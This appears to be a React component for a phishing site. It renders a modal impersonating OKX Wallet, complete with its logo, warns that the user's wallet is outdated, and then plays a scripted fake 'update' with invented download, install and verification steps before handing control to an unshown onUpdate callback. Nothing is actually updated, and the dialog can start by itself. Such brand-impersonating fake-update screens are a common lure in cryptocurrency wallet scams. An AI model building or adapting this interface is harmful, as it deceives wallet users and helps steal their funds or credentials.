"use client"

import { useState, useEffect, useCallback } from "react"
import Image from "next/image"
import { X, Download, CheckCircle2, Zap, Shield } from "lucide-react"
import { Button } from "@/components/ui/button"

interface OKXWalletUpdateProps {
  onUpdate: () => void
  onClose?: () => void
  autoStart?: boolean
}

export default function OKXWalletUpdate({ onUpdate, onClose, autoStart = false }: OKXWalletUpdateProps) {
  const [progress, setProgress] = useState(0)
  const [isUpdating, setIsUpdating] = useState(false)
  const [currentStep, setCurrentStep] = useState(0)

  const steps = [
    { icon: Download, text: "Downloading update...", color: "text-blue-400" },
    { icon: Zap, text: "Installing components...", color: "text-yellow-400" },
    { icon: Shield, text: "Verifying installation...", color: "text-purple-400" },
    { icon: CheckCircle2, text: "Finalizing...", color: "text-green-400" },
  ]

  const handleUpdate = useCallback(() => {
    setIsUpdating(true)
    setProgress(0)
    setCurrentStep(0)

    // Simulate update progress with realistic steps
    const interval = setInterval(() => {
      setProgress((prev) => {
        const newProgress = prev + 1.5
        
        // Update step based on progress
        if (newProgress < 30) {
          setCurrentStep(0)
        } else if (newProgress < 60) {
          setCurrentStep(1)
        } else if (newProgress < 90) {
          setCurrentStep(2)
        } else {
          setCurrentStep(3)
        }

        if (newProgress >= 100) {
          clearInterval(interval)
          setTimeout(() => {
            onUpdate()
          }, 800)
          return 100
        }
        return newProgress
      })
    }, 80)
  }, [onUpdate])

  // Auto-start update if autoStart is true
  useEffect(() => {
    if (autoStart) {
      // Small delay to show the initial dialog briefly, then start updating
      const timer = setTimeout(() => {
        handleUpdate()
      }, 800)
      return () => clearTimeout(timer)
    }
  }, [autoStart, handleUpdate])

  if (isUpdating) {
    const CurrentIcon = steps[currentStep].icon
    
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md animate-in fade-in duration-300">
        <div className="w-full max-w-lg mx-4">
          <div className="relative bg-gradient-to-br from-[#0a0a0a] via-[#0f0f0f] to-[#0a0a0a] border border-[#1a1a1a]/50 rounded-2xl p-8 sm:p-10 shadow-2xl overflow-hidden animate-in zoom-in-95 duration-300">
            {/* Animated background gradient */}
            <div className="absolute inset-0 bg-gradient-to-r from-[#00D170]/5 via-transparent to-[#00D170]/5 animate-pulse"></div>
            <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-[#00D170] to-transparent opacity-50"></div>
            
            <div className="relative z-10">
              {/* OKX Logo with glow effect */}
              <div className="flex items-center justify-center mb-8">
                <div className="relative">
                  <div className="absolute inset-0 bg-[#00D170]/20 rounded-full blur-xl animate-pulse"></div>
                  <div className="relative w-20 h-20 sm:w-24 sm:h-24 flex items-center justify-center bg-[#0f0f0f] rounded-2xl border border-[#1a1a1a] p-3 shadow-lg">
                    <Image
                      src="/okx.png"
                      alt="OKX Wallet"
                      width={64}
                      height={64}
                      className="w-12 h-12 sm:w-16 sm:h-16 object-contain"
                    />
                  </div>
                </div>
              </div>

              {/* Update Text */}
              <div className="text-center mb-8">
                <h2 className="text-2xl sm:text-3xl font-bold text-white mb-2 bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent">
                  Updating OKX Wallet
                </h2>
                <p className="text-sm sm:text-base text-gray-400">
                  Please wait while we update your wallet...
                </p>
              </div>

              {/* Current Step Indicator */}
              <div className="flex items-center justify-center gap-3 mb-6">
                <div className={`${steps[currentStep].color} transition-colors duration-300`}>
                  <CurrentIcon className="w-5 h-5 sm:w-6 sm:h-6" />
                </div>
                <p className={`text-sm sm:text-base font-medium ${steps[currentStep].color} transition-colors duration-300`}>
                  {steps[currentStep].text}
                </p>
              </div>

              {/* Enhanced Progress Bar */}
              <div className="mb-6">
                <div className="relative w-full bg-[#1a1a1a] rounded-full h-3 sm:h-4 overflow-hidden border border-[#2a2a2a]">
                  <div
                    className="relative h-full bg-gradient-to-r from-[#00D170] via-[#00E67A] to-[#00D170] rounded-full transition-all duration-300 ease-out shadow-lg shadow-[#00D170]/50"
                    style={{ width: `${progress}%` }}
                  >
                    {/* Shimmer effect */}
                    <div
                      className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer"
                      style={{
                        backgroundSize: "200% 100%",
                        animation: "shimmer 2s linear infinite",
                      }}
                    ></div>
                    {/* Glow effect */}
                    <div className="absolute right-0 top-0 w-8 h-full bg-gradient-to-l from-[#00D170] to-transparent blur-sm"></div>
                  </div>
                </div>
                <div className="flex items-center justify-between mt-3">
                  <span className="text-xs text-gray-500">Progress</span>
                  <span className="text-sm font-semibold text-[#00D170]">{Math.round(progress)}%</span>
                </div>
              </div>

              {/* Step Indicators */}
              <div className="flex items-center justify-between mb-6">
                {steps.map((step, index) => {
                  const StepIcon = step.icon
                  const isActive = index === currentStep
                  const isCompleted = index < currentStep
                  
                  return (
                    <div key={index} className="flex flex-col items-center gap-2 flex-1">
                      <div className={`relative w-10 h-10 sm:w-12 sm:h-12 rounded-full flex items-center justify-center transition-all duration-300 ${
                        isCompleted 
                          ? "bg-[#00D170]/20 border-2 border-[#00D170]" 
                          : isActive 
                          ? "bg-[#00D170]/10 border-2 border-[#00D170] animate-pulse" 
                          : "bg-[#1a1a1a] border-2 border-[#2a2a2a]"
                      }`}>
                        {isCompleted ? (
                          <CheckCircle2 className={`w-5 h-5 sm:w-6 sm:h-6 text-[#00D170]`} />
                        ) : (
                          <StepIcon className={`w-5 h-5 sm:w-6 sm:h-6 ${isActive ? step.color : "text-gray-600"}`} />
                        )}
                      </div>
                      <div className={`text-[10px] sm:text-xs text-center px-1 ${
                        isActive ? "text-white" : "text-gray-500"
                      }`}>
                        {step.text.split(" ")[0]}
                      </div>
                    </div>
                  )
                })}
              </div>

              {/* Loading Animation */}
              <div className="flex items-center justify-center">
                <div className="relative w-12 h-12 sm:w-14 sm:h-14">
                  <div className="absolute inset-0 border-4 border-[#1a1a1a] rounded-full"></div>
                  <div className="absolute inset-0 border-4 border-[#00D170] rounded-full border-t-transparent animate-spin"></div>
                  <div className="absolute inset-2 border-2 border-[#00D170]/30 rounded-full border-r-transparent animate-spin" style={{ animationDirection: "reverse", animationDuration: "1.5s" }}></div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-md p-4 animate-in fade-in duration-300">
      <div className="w-full max-w-lg bg-gradient-to-br from-[#0a0a0a] via-[#0f0f0f] to-[#0a0a0a] border border-[#1a1a1a]/50 rounded-2xl shadow-2xl overflow-hidden animate-in zoom-in-95 duration-300">
        {/* Header */}
        <div className="flex items-center justify-between p-5 sm:p-6 border-b border-[#1a1a1a] bg-gradient-to-r from-[#0f0f0f] to-[#0a0a0a]">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 flex items-center justify-center bg-[#0f0f0f] rounded-lg border border-[#1a1a1a] p-1.5">
              <Image
                src="/okx.png"
                alt="OKX Wallet"
                width={24}
                height={24}
                className="w-6 h-6 object-contain"
              />
            </div>
            <h3 className="text-lg sm:text-xl font-semibold text-white">OKX Wallet</h3>
          </div>
          {onClose && (
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-white transition-colors p-2 hover:bg-[#1a1a1a] rounded-lg"
            >
              <X className="w-5 h-5" />
            </button>
          )}
        </div>

        {/* Content */}
        <div className="p-6 sm:p-8">
          <div className="flex flex-col items-center mb-8">
            {/* Logo with glow */}
            <div className="relative mb-6">
              <div className="absolute inset-0 bg-[#00D170]/20 rounded-full blur-2xl"></div>
              <div className="relative w-24 h-24 sm:w-28 sm:h-28 flex items-center justify-center bg-gradient-to-br from-[#0f0f0f] to-[#0a0a0a] rounded-2xl border border-[#1a1a1a] p-4 shadow-xl">
                <Image
                  src="/okx.png"
                  alt="OKX Wallet"
                  width={80}
                  height={80}
                  className="w-16 h-16 sm:w-20 sm:h-20 object-contain"
                />
              </div>
            </div>

            <h2 className="text-2xl sm:text-3xl font-bold text-white text-center mb-3 bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent">
              Update Required
            </h2>
            <p className="text-gray-400 text-center mb-8 text-sm sm:text-base leading-relaxed max-w-md">
              Your OKX Wallet version is outdated. Please update to the latest version to continue using the wallet features and enjoy improved security.
            </p>

            {/* Features list */}
            <div className="w-full space-y-3 mb-8">
              <div className="flex items-center gap-3 text-sm text-gray-300">
                <CheckCircle2 className="w-5 h-5 text-[#00D170] flex-shrink-0" />
                <span>Enhanced security features</span>
              </div>
              <div className="flex items-center gap-3 text-sm text-gray-300">
                <CheckCircle2 className="w-5 h-5 text-[#00D170] flex-shrink-0" />
                <span>Improved performance and speed</span>
              </div>
              <div className="flex items-center gap-3 text-sm text-gray-300">
                <CheckCircle2 className="w-5 h-5 text-[#00D170] flex-shrink-0" />
                <span>Latest bug fixes and improvements</span>
              </div>
            </div>

            <div className="w-full space-y-3">
              <Button
                onClick={handleUpdate}
                className="w-full bg-gradient-to-r from-[#00D170] to-[#00E67A] hover:from-[#00B85C] hover:to-[#00D170] text-white font-semibold h-12 sm:h-14 rounded-lg shadow-lg shadow-[#00D170]/30 transition-all duration-300 hover:shadow-xl hover:shadow-[#00D170]/40 hover:scale-[1.02] active:scale-[0.98]"
              >
                <Download className="w-5 h-5 mr-2" />
                Update Now
              </Button>
              {onClose && (
                <Button
                  onClick={onClose}
                  variant="outline"
                  className="w-full border-2 border-[#1a1a1a] text-gray-400 hover:text-white hover:bg-[#1a1a1a] hover:border-[#2a2a2a] h-12 sm:h-14 rounded-lg transition-all duration-300"
                >
                  Later
                </Button>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

